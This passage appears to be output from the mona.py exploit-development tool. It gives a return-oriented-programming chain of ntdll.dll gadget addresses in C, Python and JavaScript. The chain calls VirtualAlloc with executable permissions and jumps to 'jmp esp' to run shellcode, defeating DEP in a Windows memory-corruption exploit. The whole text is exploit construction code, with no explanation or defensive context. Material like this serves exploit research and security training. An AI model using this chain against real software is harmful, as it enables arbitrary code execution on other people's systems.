      0x7738bed9,  // POP EBX // RETN [ntdll.dll] 
      0x00000001,  // 0x00000001-> ebx
      0x7738bf81,  // POP EDX // RETN [ntdll.dll] 
      0x00001000,  // 0x00001000-> edx
      0x773d3631,  // POP ECX // RETN [ntdll.dll] 
      0x00000040,  // 0x00000040-> ecx
      0x7738c43c,  // POP EDI // RETN [ntdll.dll] 
      0x773b35c1,  // RETN (ROP NOP) [ntdll.dll]
      0x77370455,  // POP ESI // RETN [ntdll.dll] 
      0x7733e8ae,  // JMP [EAX] [ntdll.dll]
      0x773c3c85,  // POP EAX // ADD DH,D // RETN [ntdll.dll] 
      0x765216d0,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT ADVAPI32.dll]
      0x773881ed,  // PUSHAD // DEC EBX // MOV EBX,33C233F6 // RETN [ntdll.dll] 
      0x7733bf43,  // ptr to 'jmp esp' [ntdll.dll]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x773a31bc,  # POP EBP # RETN [ntdll.dll] 
      0x773a31bc,  # skip 4 bytes [ntdll.dll]
      0x7738bed9,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x7738bf81,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x773d3631,  # POP ECX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x7738c43c,  # POP EDI # RETN [ntdll.dll] 
      0x773b35c1,  # RETN (ROP NOP) [ntdll.dll]
      0x77370455,  # POP ESI # RETN [ntdll.dll] 
      0x7733e8ae,  # JMP [EAX] [ntdll.dll]
      0x773c3c85,  # POP EAX # ADD DH,D # RETN [ntdll.dll] 
      0x765216d0,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT ADVAPI32.dll]
      0x773881ed,  # PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
      0x7733bf43,  # ptr to 'jmp esp' [ntdll.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u31bc%u773a" + // 0x773a31bc : ,# POP EBP # RETN [ntdll.dll] 
    "%u31bc%u773a" + // 0x773a31bc : ,# skip 4 bytes [ntdll.dll]
    "%ubed9%u7738" + // 0x7738bed9 : ,# POP EBX # RETN [ntdll.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%ubf81%u7738" + // 0x7738bf81 : ,# POP EDX # RETN [ntdll.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%u3631%u773d" + // 0x773d3631 : ,# POP ECX # RETN [ntdll.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%uc43c%u7738" + // 0x7738c43c : ,# POP EDI # RETN [ntdll.dll] 
    "%u35c1%u773b" + // 0x773b35c1 : ,# RETN (ROP NOP) [ntdll.dll]
    "%u0455%u7737" + // 0x77370455 : ,# POP ESI # RETN [ntdll.dll] 
    "%ue8ae%u7733" + // 0x7733e8ae : ,# JMP [EAX] [ntdll.dll]
    "%u3c85%u773c" + // 0x773c3c85 : ,# POP EAX # ADD DH,D # RETN [ntdll.dll] 
    "%u16d0%u7652" + // 0x765216d0 : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT ADVAPI32.dll]
    "%u81ed%u7738" + // 0x773881ed : ,# PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
    "%ubf43%u7733" + // 0x7733bf43 : ,# ptr to 'jmp esp' [ntdll.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------

